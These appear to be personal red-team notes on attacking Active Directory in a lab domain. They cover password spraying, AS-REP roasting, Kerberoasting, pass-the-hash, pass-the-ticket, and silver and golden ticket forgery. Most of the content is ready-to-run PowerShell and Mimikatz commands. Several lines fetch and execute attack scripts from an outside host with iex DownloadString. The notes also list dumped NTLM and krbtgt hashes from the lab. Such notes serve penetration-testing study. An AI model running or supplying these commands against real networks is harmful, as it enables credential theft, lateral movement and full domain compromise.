## Active Directory Primer

Users,group computers
Organizational Units
AD Authentication
Trees, Forest, Trust -> tiktok

https://rootdse.org/posts/active-directory-basics-1/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

https://nored0x.github.io/red-teaming/active-directory-domain-enumeration-part-1/

https://github.com/davidprowe/BadBlood

### AD Enumeration

```bash
Password Spraying
#  https://github.com/dafthack/DomainPasswordSpray

cd .\Scripts\credentials
. .\DomainPasswordSpray.ps1

cd ../../
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose


# BloodHound
# PowerView
```

### AD Privilege Escalation

```powershell
# AS-REP Roasting
powershell -ep bypass
. .\PowerView.ps1

## Determine if the "Do not require preauthentication" option is enabled
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }

.\Rubeus.exe asreproast /user:johnny /outfile:johnhash.txt


.\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txt



# Kerberoasting
powershell -ep bypass
. .\PowerView.ps1

### fetch all the users from the network and filters out those with SPN enabled:
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T research -Q */*

klist

### adds the assembly System.IdentityModel to the current PowerShell session and creates a new object of type KerberosRequestorSecurityToken. This is part of the .NET framework and is used to request a Kerberos Ticket Granting Service (TGS) ticket for the specified Service Principal Name (SPN).
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “ops/research.SECURITY.local:1434”


. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -command '"kerberos::list /export"’

ls | select name

### crack the password
python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi

```

### AD Lateral Movement

```powershell
# Pass-the-Hash
cd C:\Tools
powershell -ep bypass
. .\PowerView.ps1

Get-Domain

Find-LocalAdminAccess
#Access the seclogs.research.SECURITY.local
Enter-PSSession seclogs.research.SECURITY.local

#full privs on seclogs.research.SECURITY.local machine.
whoami /all

#enumerate all the available tokens.
cd /
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')

Invoke-TokenManipulation –Enumerate

iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

cd C:\Tools
powershell -ep bypass
. .\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'

Enter-PSSession prod.research.SECURITY.local

# Pass-the-Ticket
#https://www.netwrix.com/pass_the_ticket.html
Find-LocalAdminAccess
Enter-PSSession seclogs.research.SECURITY.local

# nos traemos mimikatz con hfs
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls | select name

Invoke-Mimikatz -Command ‘"kerberos::ptt [0;2c1c7]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"’

klist

ls \\prod.research.security.local\c$

```

### AD Persistence

```bash
# Silver Ticket
https://adsecurity.org/?p=2011

cd C:\Tools
powershell -ep bypass
. .\PowerView.ps1

Get-Domain

Get-DomainSID

Find-LocalAdminAccess

Enter-PSSession seclogs.research.SECURITY.local

whoami /all

iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')

Invoke-TokenManipulation –Enumerate

#import Invoke-Mimikatz.ps1 script on the target machine and dump NTLM hash of the logged in users.
iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'

#find the computer account password hash for the target machine:
Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local

ls \\prod.research.SECURITY.local\C$
# Create a silver ticket
Invoke-Mimikatz -Command '"kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:d5f92467d4425e5f34fb55893e8a7768 /user:administrator /ptt"'

klist
ls \\prod.research.SECURITY.local\C$

# Golden Ticket
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

###Execute passthehash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909"'
###Retrieve KRBTGT Account Hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName prod.research.security.local
### Generate and Implement a Golden Ticket

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
### Validate Access to Domain Controller
klist
dir \\prod.research.security.local\c$

```
